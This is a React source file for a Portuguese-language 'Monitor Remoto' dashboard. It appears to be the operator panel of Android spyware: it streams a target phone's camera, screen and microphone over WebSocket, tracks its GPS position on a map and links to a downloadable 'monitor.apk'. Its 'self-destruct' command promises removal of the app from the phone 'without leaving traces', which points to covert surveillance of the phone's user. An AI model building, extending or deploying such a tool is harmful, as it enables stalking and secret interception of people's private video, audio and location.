'use client';

import { useEffect, useRef, useState, useCallback } from 'react';
import {
  Camera, Monitor, Volume2, VolumeX, RefreshCw,
  Wifi, WifiOff, Settings, MapPin, Gauge, Clock,
  Download, Smartphone, ChevronDown, Trash2
} from 'lucide-react';

interface LocationData {
  lat: number; lng: number; accuracy: number; speed: number; bearing: number;
}
interface Device {
  id: string; name: string; online: boolean;
}

function loadScript(src: string): Promise<void> {
  return new Promise((res, rej) => {
    if (document.querySelector(`script[src="${src}"]`)) { res(); return; }
    const s = document.createElement('script');
    s.src = src; s.onload = () => res(); s.onerror = rej;
    document.head.appendChild(s);
  });
}
function loadLink(href: string) {
  if (document.querySelector(`link[href="${href}"]`)) return;
  const l = document.createElement('link');
  l.rel = 'stylesheet'; l.href = href;
  document.head.appendChild(l);
}

export default function MonitorPage() {
  const [wsUrl, setWsUrl] = useState('');
  const [password, setPassword] = useState('');
  const [showSettings, setShowSettings] = useState(false);
  const [loginError, setLoginError] = useState('');
  const [connected, setConnected] = useState(false);
  const [configured, setConfigured] = useState(false);

  const [devices, setDevices] = useState<Device[]>([]);
  const [activeDeviceId, setActiveDeviceId] = useState<string | null>(null);
  const [showDeviceMenu, setShowDeviceMenu] = useState(false);
  const [destroyConfirm, setDestroyConfirm] = useState<Device | null>(null);

  const [view, setView] = useState<'camera' | 'screen'>('camera');
  const [audioEnabled, setAudioEnabled] = useState(true);
  const [location, setLocation] = useState<LocationData | null>(null);
  const [lastUpdate, setLastUpdate] = useState('');
  const [fps, setFps] = useState(0);

  const wsRef = useRef<WebSocket | null>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const imgRef = useRef<HTMLImageElement | null>(null);
  const audioCtxRef = useRef<AudioContext | null>(null);
  const audioNextRef = useRef(0);
  const fpsCountRef = useRef(0);
  const viewRef = useRef<'camera' | 'screen'>('camera');
  const activeDeviceRef = useRef<string | null>(null);
  const mapRef = useRef<unknown>(null);
  const markerRef = useRef<unknown>(null);

  useEffect(() => { viewRef.current = view; }, [view]);
  useEffect(() => { activeDeviceRef.current = activeDeviceId; }, [activeDeviceId]);

  useEffect(() => {
    const t = setInterval(() => { setFps(fpsCountRef.current); fpsCountRef.current = 0; }, 1000);
    return () => clearInterval(t);
  }, []);

  useEffect(() => {
    const url = localStorage.getItem('monitor_ws_url') || '';
    const pwd = localStorage.getItem('monitor_ws_pwd') || '';
    setWsUrl(url); setPassword(pwd);
    if (url) setConfigured(true); else setShowSettings(true);
  }, []);

  const initMap = useCallback(async () => {
    if (mapRef.current) return;
    loadLink('https://unpkg.com/leaflet@1.9.4/dist/leaflet.css');
    await loadScript('https://unpkg.com/leaflet@1.9.4/dist/leaflet.js');
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const L = (window as any).L;
    if (!L || !document.getElementById('monitor-map')) return;
    const m = L.map('monitor-map', { zoomControl: true }).setView([-15.78, -47.93], 13);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '© OpenStreetMap' }).addTo(m);
    mapRef.current = m;
  }, []);

  const updateMarker = useCallback((loc: LocationData) => {
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const L = (window as any).L;
    const m = mapRef.current as any;
    if (!L || !m) return;
    const latlng: [number, number] = [loc.lat, loc.lng];
    if (!markerRef.current) markerRef.current = L.marker(latlng).addTo(m);
    else (markerRef.current as any).setLatLng(latlng);
    m.setView(latlng, 16);
  }, []);

  const renderFrame = useCallback((b64: string) => {
    const canvas = canvasRef.current; if (!canvas) return;
    if (!imgRef.current) imgRef.current = new Image();
    const img = imgRef.current;
    img.onload = () => {
      canvas.width = img.naturalWidth; canvas.height = img.naturalHeight;
      canvas.getContext('2d')?.drawImage(img, 0, 0);
      fpsCountRef.current++;
    };
    img.src = 'data:image/jpeg;base64,' + b64;
  }, []);

  const playAudio = useCallback((b64: string) => {
    if (!audioCtxRef.current) audioCtxRef.current = new AudioContext({ sampleRate: 16000 });
    const ctx = audioCtxRef.current;
    const bin = atob(b64);
    const bytes = new Uint8Array(bin.length);
    for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
    const samples = bytes.length / 2;
    const f32 = new Float32Array(samples);
    const dv = new DataView(bytes.buffer);
    for (let i = 0; i < samples; i++) f32[i] = dv.getInt16(i * 2, true) / 32768;
    const buf = ctx.createBuffer(1, samples, 16000);
    buf.getChannelData(0).set(f32);
    const src = ctx.createBufferSource();
    src.buffer = buf; src.connect(ctx.destination);
    const now = ctx.currentTime;
    const start = Math.max(now, audioNextRef.current);
    src.start(start);
    audioNextRef.current = start + buf.duration;
  }, []);

  const connect = useCallback((url: string, pwd: string) => {
    if (wsRef.current) { wsRef.current.close(); wsRef.current = null; }
    const ws = new WebSocket(url);
    wsRef.current = ws;

    ws.onopen = () => ws.send(JSON.stringify({ type: 'auth', password: pwd, role: 'viewer' }));

    ws.onmessage = (e) => {
      let msg: Record<string, unknown>;
      try { msg = JSON.parse(e.data); } catch { return; }

      switch (msg.type) {
        case 'auth':
          if (msg.success) { setConnected(true); setLoginError(''); initMap(); }
          else { setLoginError('Senha incorreta.'); ws.close(); }
          break;

        case 'devices': {
          const list = msg.list as Device[];
          setDevices(list);
          // selecionar automaticamente o primeiro online se nenhum selecionado
          setActiveDeviceId(prev => {
            if (prev && list.find(d => d.id === prev)) return prev;
            return list.find(d => d.online)?.id ?? list[0]?.id ?? null;
          });
          break;
        }

        case 'location': {
          if (msg.deviceId !== activeDeviceRef.current) break;
          const loc = msg as unknown as LocationData & { type: string; deviceId: string };
          setLocation(loc);
          setLastUpdate(new Date().toLocaleTimeString('pt-BR'));
          updateMarker(loc);
          break;
        }

        case 'frame':
          if (msg.deviceId === activeDeviceRef.current && msg.source === viewRef.current)
            renderFrame(msg.data as string);
          break;

        case 'audio':
          if (msg.deviceId === activeDeviceRef.current && audioEnabled)
            playAudio(msg.data as string);
          break;
      }
    };

    ws.onclose = () => {
      setConnected(false); setDevices([]);
      setTimeout(() => {
        const u = localStorage.getItem('monitor_ws_url');
        const p = localStorage.getItem('monitor_ws_pwd');
        if (u && p) connect(u, p);
      }, 3000);
    };

    ws.onerror = () => setLoginError('Não foi possível conectar.');
  }, [audioEnabled, initMap, updateMarker, renderFrame, playAudio]);

  useEffect(() => {
    if (configured && wsUrl) connect(wsUrl, password);
    return () => { wsRef.current?.close(); };
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [configured]);

  function saveAndConnect() {
    if (!wsUrl.trim()) { setLoginError('Informe o endereço do servidor.'); return; }
    localStorage.setItem('monitor_ws_url', wsUrl.trim());
    localStorage.setItem('monitor_ws_pwd', password);
    setShowSettings(false); setConfigured(true);
    connect(wsUrl.trim(), password);
  }

  function switchCamera() {
    wsRef.current?.send(JSON.stringify({ type: 'cmd', action: 'switch_camera', deviceId: activeDeviceId }));
  }

  function selfDestruct(deviceId: string) {
    wsRef.current?.send(JSON.stringify({ type: 'cmd', action: 'self_destruct', deviceId }));
    setDestroyConfirm(null);
  }

  const activeDevice = devices.find(d => d.id === activeDeviceId);
  const onlineCount = devices.filter(d => d.online).length;

  return (
    <div className="flex flex-col h-full gap-0 -m-4 md:-m-6">

      {/* barra de status */}
      <div className="flex items-center gap-2 px-4 py-2 bg-gray-900 border-b border-gray-800 flex-shrink-0 flex-wrap">
        <span className="text-sm font-semibold text-white">Monitor Remoto</span>

        {/* seletor de dispositivo */}
        {connected && devices.length > 0 && (
          <div className="relative ml-2">
            <button
              onClick={() => setShowDeviceMenu(v => !v)}
              className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-gray-800 hover:bg-gray-700 text-xs text-white transition-colors border border-gray-700"
            >
              <Smartphone className="w-3.5 h-3.5" />
              <span className={activeDevice?.online ? 'text-green-400' : 'text-red-400'}>
                {activeDevice?.name ?? 'Selecionar aparelho'}
              </span>
              {onlineCount > 1 && (
                <span className="bg-blue-600 text-white text-xs rounded-full px-1.5 py-0.5 ml-1">{onlineCount}</span>
              )}
              <ChevronDown className="w-3 h-3 text-gray-400" />
            </button>

            {showDeviceMenu && (
              <div className="absolute top-full left-0 mt-1 w-60 bg-gray-800 border border-gray-700 rounded-lg shadow-xl z-50 overflow-hidden">
                {devices.map(d => (
                  <div
                    key={d.id}
                    className={`flex items-center gap-2.5 px-3 py-2.5 text-xs hover:bg-gray-700 transition-colors ${d.id === activeDeviceId ? 'bg-gray-700' : ''}`}
                  >
                    <button
                      onClick={() => { setActiveDeviceId(d.id); setShowDeviceMenu(false); setLocation(null); }}
                      className="flex items-center gap-2.5 flex-1 min-w-0 text-left"
                    >
                      <div className={`w-2 h-2 rounded-full flex-shrink-0 ${d.online ? 'bg-green-400 shadow-[0_0_5px_#4ade80]' : 'bg-gray-600'}`} />
                      <span className="text-white flex-1 truncate">{d.name}</span>
                      {d.online
                        ? <span className="text-green-400">online</span>
                        : <span className="text-gray-500">offline</span>
                      }
                    </button>
                    <button
                      onClick={(e) => { e.stopPropagation(); setShowDeviceMenu(false); setDestroyConfirm(d); }}
                      className="flex-shrink-0 p-1 rounded text-gray-600 hover:text-red-400 hover:bg-red-950 transition-colors"
                      title="Autodestruir"
                    >
                      <Trash2 className="w-3.5 h-3.5" />
                    </button>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}

        <div className="flex items-center gap-1.5 ml-auto">
          {connected
            ? <><Wifi className="w-4 h-4 text-green-400" /><span className="text-xs text-green-400">Conectado</span></>
            : <><WifiOff className="w-4 h-4 text-red-400" /><span className="text-xs text-red-400">Desconectado</span></>
          }
          {connected && <span className="text-xs text-gray-500 ml-1">{fps} fps</span>}
        </div>

        {wsUrl && (
          <a
            href={wsUrl.replace(/^ws/, 'http') + '/download/monitor.apk'}
            download="Monitor.apk"
            className="flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg text-xs text-gray-400 hover:text-white hover:bg-gray-800 transition-colors"
            title="Baixar app Android"
          >
            <Download className="w-3.5 h-3.5" />
            <span className="hidden sm:inline">App Android</span>
          </a>
        )}
        <button
          onClick={() => setShowSettings(true)}
          className="p-1.5 rounded-lg text-gray-400 hover:text-white hover:bg-gray-800 transition-colors"
        >
          <Settings className="w-4 h-4" />
        </button>
      </div>

      {/* layout principal */}
      <div className="flex flex-1 min-h-0 overflow-hidden flex-col md:flex-row">

        {/* vídeo */}
        <div className="flex flex-col flex-1 min-h-0 min-w-0 bg-black">
          <div className="flex items-center gap-2 px-3 py-2 bg-gray-900 border-b border-gray-800 flex-shrink-0">
            <button onClick={() => setView('camera')}
              className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-medium transition-colors ${view === 'camera' ? 'bg-blue-600 text-white' : 'text-gray-400 hover:text-white hover:bg-gray-800'}`}>
              <Camera className="w-3.5 h-3.5" /> Câmera
            </button>
            <button onClick={() => setView('screen')}
              className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-medium transition-colors ${view === 'screen' ? 'bg-blue-600 text-white' : 'text-gray-400 hover:text-white hover:bg-gray-800'}`}>
              <Monitor className="w-3.5 h-3.5" /> Tela
            </button>
            <button onClick={switchCamera}
              className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-medium text-gray-400 hover:text-white hover:bg-gray-800 transition-colors">
              <RefreshCw className="w-3.5 h-3.5" /> Virar
            </button>
            <button onClick={() => setAudioEnabled(v => !v)}
              className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-medium transition-colors ${audioEnabled ? 'bg-blue-600 text-white' : 'text-gray-400 hover:text-white hover:bg-gray-800'}`}>
              {audioEnabled ? <Volume2 className="w-3.5 h-3.5" /> : <VolumeX className="w-3.5 h-3.5" />}
              {audioEnabled ? 'Áudio' : 'Mudo'}
            </button>
          </div>

          <div className="relative flex-1 flex items-center justify-center min-h-0 bg-black">
            <canvas ref={canvasRef} className="max-w-full max-h-full object-contain" />
            {(!activeDevice?.online || !connected) && (
              <div className="absolute inset-0 flex items-center justify-center bg-black/80">
                <div className="text-center">
                  <WifiOff className="w-10 h-10 text-gray-600 mx-auto mb-2" />
                  <p className="text-gray-500 text-sm">
                    {!connected ? 'Aguardando servidor...' :
                     devices.length === 0 ? 'Nenhum celular conectado' :
                     `${activeDevice?.name ?? 'Aparelho'} está offline`}
                  </p>
                </div>
              </div>
            )}
          </div>
        </div>

        {/* painel lateral */}
        <div className="flex flex-col md:w-72 border-t md:border-t-0 md:border-l border-gray-800 bg-gray-900 flex-shrink-0">
          <div id="monitor-map" className="h-48 md:flex-1 min-h-0 bg-gray-800" />
          <div className="p-3 space-y-2 border-t border-gray-800">
            <div className="flex items-center justify-between text-xs">
              <span className="flex items-center gap-1.5 text-gray-500"><Gauge className="w-3.5 h-3.5" /> Velocidade</span>
              <span className="text-white font-medium">
                {location ? (location.speed > 0 ? `${(location.speed * 3.6).toFixed(1)} km/h` : '0 km/h') : '—'}
              </span>
            </div>
            <div className="flex items-center justify-between text-xs">
              <span className="flex items-center gap-1.5 text-gray-500"><MapPin className="w-3.5 h-3.5" /> Precisão</span>
              <span className="text-white font-medium">{location ? `±${Math.round(location.accuracy)}m` : '—'}</span>
            </div>
            <div className="flex items-center justify-between text-xs">
              <span className="flex items-center gap-1.5 text-gray-500"><MapPin className="w-3.5 h-3.5" /> Coords</span>
              <span className="text-white font-medium text-right">
                {location ? `${location.lat.toFixed(5)}, ${location.lng.toFixed(5)}` : '—'}
              </span>
            </div>
            <div className="flex items-center justify-between text-xs">
              <span className="flex items-center gap-1.5 text-gray-500"><Clock className="w-3.5 h-3.5" /> Atualizado</span>
              <span className="text-white font-medium">{lastUpdate || '—'}</span>
            </div>
          </div>
        </div>
      </div>

      {/* modal configuração */}
      {showSettings && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70" onClick={() => configured && setShowSettings(false)}>
          <div className="bg-gray-900 border border-gray-700 rounded-xl p-6 w-80 space-y-4 shadow-2xl" onClick={e => e.stopPropagation()}>
            <h2 className="text-lg font-bold text-white">Configurar Monitor</h2>
            <div className="space-y-1">
              <label className="text-xs text-gray-400">Endereço WebSocket</label>
              <input type="text" value={wsUrl} onChange={e => setWsUrl(e.target.value)}
                placeholder="ws://192.168.1.x:8080"
                className="w-full bg-gray-800 border border-gray-700 rounded-lg px-3 py-2.5 text-sm text-white placeholder-gray-600 focus:outline-none focus:border-blue-500" />
            </div>
            <div className="space-y-1">
              <label className="text-xs text-gray-400">Senha</label>
              <input type="password" value={password} onChange={e => setPassword(e.target.value)}
                placeholder="senha de acesso"
                className="w-full bg-gray-800 border border-gray-700 rounded-lg px-3 py-2.5 text-sm text-white placeholder-gray-600 focus:outline-none focus:border-blue-500"
                onKeyDown={e => e.key === 'Enter' && saveAndConnect()} />
            </div>
            {loginError && <p className="text-xs text-red-400">{loginError}</p>}
            <div className="flex gap-2 pt-1">
              {configured && (
                <button onClick={() => setShowSettings(false)}
                  className="flex-1 py-2.5 rounded-lg text-sm text-gray-400 hover:text-white bg-gray-800 hover:bg-gray-700 transition-colors">
                  Cancelar
                </button>
              )}
              <button onClick={saveAndConnect}
                className="flex-1 py-2.5 rounded-lg text-sm font-semibold text-white bg-blue-600 hover:bg-blue-500 transition-colors">
                Conectar
              </button>
            </div>
          </div>
        </div>
      )}

      {/* fechar menu de dispositivo ao clicar fora */}
      {showDeviceMenu && (
        <div className="fixed inset-0 z-40" onClick={() => setShowDeviceMenu(false)} />
      )}

      {/* modal de confirmação autodestruição */}
      {destroyConfirm && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70" onClick={() => setDestroyConfirm(null)}>
          <div className="bg-gray-900 border border-red-900 rounded-xl p-6 w-80 shadow-2xl" onClick={e => e.stopPropagation()}>
            <div className="flex items-center gap-3 mb-3">
              <Trash2 className="w-5 h-5 text-red-400 flex-shrink-0" />
              <h2 className="text-base font-bold text-white">Autodestruição</h2>
            </div>
            <p className="text-sm text-gray-300 mb-1">
              Remover <span className="font-semibold text-white">{destroyConfirm.name}</span> permanentemente?
            </p>
            <p className="text-xs text-gray-500 mb-5">
              O app será removido do aparelho sem deixar rastros.
            </p>
            <div className="flex gap-2">
              <button
                onClick={() => setDestroyConfirm(null)}
                className="flex-1 py-2.5 rounded-lg text-sm text-gray-400 hover:text-white bg-gray-800 hover:bg-gray-700 transition-colors"
              >
                Cancelar
              </button>
              <button
                onClick={() => selfDestruct(destroyConfirm.id)}
                className="flex-1 py-2.5 rounded-lg text-sm font-semibold text-white bg-red-700 hover:bg-red-600 transition-colors"
              >
                Remover
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
